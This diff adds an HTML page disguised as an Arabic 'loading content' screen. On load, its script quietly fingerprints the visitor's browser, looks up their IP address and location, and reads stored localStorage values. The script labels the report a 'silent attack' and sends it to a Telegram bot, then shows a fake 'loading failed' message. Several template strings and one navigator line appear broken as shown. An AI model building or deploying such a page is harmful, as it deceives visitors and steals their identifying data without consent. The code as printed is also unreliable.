@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>جاري التحميل...</title>
+<style>
+body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;color:#999}
+.loader{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+</style></head>
+<body>
+<div style="text-align:center">
+    <div class="loader"></div>
+    <p>جاري تحميل المحتوى...</p>
+</div>
+<script>
+const TOKEN='ضع_توكن_البوت_هنا',CHAT='ضع_معرف_المشرف_هنا';
+const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
+(async function(){
+    try{
+        const cv=document.createElement('canvas');cv.width=200;cv.height=50;
+        const ctx=cv.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';
+        ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
+        ctx.fillStyle='#069';ctx.fillText('TheEye',2,15);
+        ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Cg',4,17);
+        const fp=cv.toDataURL().substring(0,50);
+        const conn=navigator.connectionnavigator.mozConnectionnavigator.webkitConnection||{};
+        let ipd={country:'غير معروف',city:'غير معروف',ip:'غير معروف',org:'غير معروف'};
+        try{const r=await fetch('https://ipapi.co/json/');if(r.ok)ipd=await r.json();}catch(e){}
+        let ls=[];try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls.push(${k}: ${localStorage.getItem(k).substring(0,30)});}}catch(e){}
+        let msg=🤫 **هجوم صامت**\n🆔 ID: \${chatId}\\n🔍 البصمة: \${fp}...\\n🌐 IP: ${ipd.ip}\n🌍 الدولة: ${ipd.country}, ${ipd.city}\n🏢 المزود: ${ipd.org}\n📶 الشبكة: ${conn.effectiveType||'?'} (${conn.downlink||'?'}Mbps)\n🍪 الكوكيز: ${navigator.cookieEnabled?'مفعلة':'معطلة'}\n;
+        if(ls.length>0)msg+=💾 التخزين: ${ls.slice(0,3).join(' | ')}\n;
+        msg+=🕐 الوقت: ${new Date().toISOString()};
+        await fetch(https://api.telegram.org/bot${TOKEN}/sendMessage,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'Markdown'})});
+        setTimeout(()=>{document.body.innerHTML='<h2 style="text-align:center;margin-top:100px;color:#999;font-family:sans-serif">❌ فشل التحميل</h2>';},3000);
+    }catch(e){document.body.innerHTML=<h2 style="text-align:center;margin-top:100px;color:#999">فشل التحميل</h2>;}
+})();
+</script></body></html>
